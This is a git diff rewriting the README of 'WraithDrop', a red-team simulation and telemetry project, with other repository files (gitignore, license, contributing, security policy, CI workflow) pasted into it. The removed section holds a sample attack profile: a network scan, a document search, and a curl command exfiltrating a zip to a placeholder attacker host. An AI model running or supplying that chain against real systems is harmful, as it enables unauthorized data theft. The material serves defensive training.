@@ -1,137 +1,161 @@
-# placeholder for README.md
-Here is a full README.md for your WraithDrop project:
+# WraithDrop
 
-# ⚔️ WraithDrop
+WraithDrop is a red-team simulation platform designed to emulate real-world adversary behavior with precision and stealth. It supports modular TTP profiles, dynamic command control, and telemetry logging for both offensive security training and lab automation.
 
-**WraithDrop** is a stealth-oriented Red Team simulation and telemetry framework built for ethical cybersecurity research, blue team training, and adversary emulation in controlled environments.
+## 🧠 Core Features
 
-> _“Like a shadow in the wire — it watches, it strikes, and it vanishes.”_
+- 🛰️ Modular TTP execution
+- 🧬 Host fingerprinting & environment detection
+- 📡 C2-style remote task polling
+- 🪄 Evasion profiles (`evasion.yaml`)
+- 🖥️ Browser-based dashboard (planned)
+- 📖 Full telemetry logs
 
----
+## 🚀 Quickstart
 
-## 🚩 Key Features
-
-- 🧠 **TTP Profiles** – YAML-based Tactical Technique Procedure chains
-- 📡 **Telemetry Logging** – Encrypted local and remote telemetry collection
-- 🛡️ **Evasion Modules** – Sandbox detection, fingerprinting, randomized delays
-- 📊 **Live Dashboard** – Real-time WebSocket log monitoring with host grouping
-- 🔐 **AES Encryption** – End-to-end secure event transmission
-- 🧩 **Modular Design** – Easy to extend with custom techniques or behaviors
-- 🧪 **Simulated Payloads** – No actual malware used, fully ethical
-
----
-
-## 📁 Project Structure
-
-wraithdrop/
-├── server/ # Flask + SocketIO telemetry receiver and dashboard
-│ ├── app.py # Entry point for running dashboard/API
-│ ├── telemetry.py # API endpoints and log handling
-│ └── templates/
-│ └── index.html # Dashboard frontend
-├── utils/ # Encryption, fingerprinting, and helpers
-│ ├── aes_encrypt.py # AES encrypt/decrypt utilities
-│ └── fingerprint.py # Host fingerprint logic
-├── scripts/
-│ └── telemetry_sim.py # Basic event simulator script
-├── ttp_profiles/ # YAML TTP definitions
-│ └── example.yml
-├── logs/ # Encrypted and raw telemetry logs
-├── requirements.txt # Python dependencies
-└── README.md
-
-
----
-
-## 🚀 Quick Start
-
-### 1. Clone the repo
 ```bash
-git clone https://github.com/yourusername/wraithdrop.git
+git clone https://github.com/Cooper1267/wraithdrop.git
 cd wraithdrop
+# Setup instructions here
 
-2. Create and activate a virtual environment
+📂 Project Structure
 
-python3 -m venv venv
-source venv/bin/activate
+    client/ – Agent modules
 
-3. Install dependencies
+    server/ – REST API, task dispatcher
 
-pip install -r requirements.txt
+    dashboard/ – (planned) Web UI for viewing telemetry
 
-4. Start the dashboard server
+    profiles/ – YAML-based attack simulations
 
-python3 server/app.py
+🛡️ Disclaimer
 
-The dashboard will run at: http://localhost:7000
-📡 Simulate Telemetry Events
-
-Run the basic simulator:
-
-python3 scripts/telemetry_sim.py
-
-You can customize the simulation by editing telemetry_sim.py or creating TTP YAML files in ttp_profiles/.
-🔐 AES Encryption
-
-All telemetry data is encrypted using AES before being sent over the wire. You can modify the key and IV in utils/aes_encrypt.py to suit your security model.
-🌐 Live Dashboard
-
-The real-time dashboard listens for encrypted POST requests and displays parsed logs grouped by host. It uses Flask + Socket.IO to stream new events every 2 seconds.
-
-    Incoming event payloads are automatically decrypted and logged.
-
-📂 Sample TTP YAML (Coming Soon)
-
-profile: data_exfil
-steps:
-  - action: scan_network
-    command: nmap -sS 192.168.1.0/24
-  - action: find_docs
-    command: find /home -name '*.docx'
-  - action: exfiltrate
-    command: curl -F @docs.zip http://attacker/exfil
-
-Support for loading and executing these is part of the planned roadmap.
-🧠 Use Cases
-
-    Blue team alert tuning and log correlation
-
-    Red team pre-attack behavior simulation
-
-    SOC training labs
-
-    Custom TTP emulation for detection engineering
-
-    Honeypot decoy behavior injection
-
-⚠️ Legal Disclaimer
-
-WraithDrop is intended for educational and ethical use only.
-Do not deploy or simulate unauthorized actions on systems you do not own or have explicit permission to test.
-🛠️ Roadmap
-
-Real-time telemetry dashboard
-
-Encrypted telemetry transport
-
-Basic evasion modules
-
-Full TTP YAML executor
-
-CLI runner with triggers/delays
-
-Atomic Red Team YAML support
-
-    Exportable PDF/HTML log reports
-
-👤 Author
-
-Master_Ancestor
-Microbiology undergrad | Cybersecurity Enthusiast | Code Conjurer
-🔬🛡️💻
+WraithDrop is intended for educational and authorized red team simulation only. Unauthorized use is strictly forbidden.
 📜 License
 
-MIT License – feel free to fork, extend, or contribute.
-✨ Like what you see?
+MIT
 
-Leave a ⭐ on GitHub – it feeds the Wraith.
+
+---
+
+## 🧹 2. `.gitignore` for Python + Node.js stack
+
+```gitignore
+# Python
+__pycache__/
+*.py[cod]
+*.egg
+*.egg-info/
+dist/
+build/
+.env
+venv/
+
+# Node
+node_modules/
+npm-debug.log
+yarn-debug.log
+yarn-error.log
+dist/
+.env
+*.log
+
+# VSCode/IDE
+.vscode/
+.idea/
+.DS_Store
+*.swp
+
+🔐 3. MIT License (LICENSE)
+
+MIT License
+
+Copyright (c) 2025 Cooper1267
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction...
+
+[... full MIT license text ...]
+
+🧠 4. Contributor Guidelines, Conduct, Security
+CONTRIBUTING.md
+
+# Contributing to WraithDrop
+
+Thank you for helping strengthen the shadows. To contribute:
+
+- Fork and clone the repo
+- Create a feature branch
+- Submit a clear PR with:
+  - A description of changes
+  - Associated issue (if any)
+  - Any test output or screenshots
+
+All PRs are reviewed for stealth, stability, and style.
+
+CODE_OF_CONDUCT.md
+
+# Code of Conduct
+
+We expect all contributors to uphold a standard of respect, collaboration, and discretion.
+
+Offensive behavior, discrimination, or any form of hostile interaction will result in immediate removal from the project.
+
+This isn’t just code. It’s an ethos.
+
+SECURITY.md
+
+# Security Policy
+
+Found a vulnerability?
+
+Please disclose responsibly:
+📧 Email: cooper1267@protonmail.com (or replace with preferred)
+🔒 PGP available on request
+
+We aim to patch within 72 hours of validated disclosure.
+
+📦 5. GitHub Actions – Auto Test & Lint
+.github/workflows/ci.yml
+
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '20'
+
+    - name: Install Python deps
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt || true
+
+    - name: Install Node deps
+      run: |
+        cd dashboard
+        npm install || true
+
+    - name: Run tests (placeholder)
+      run: |
+        echo "No tests yet. Add them here."
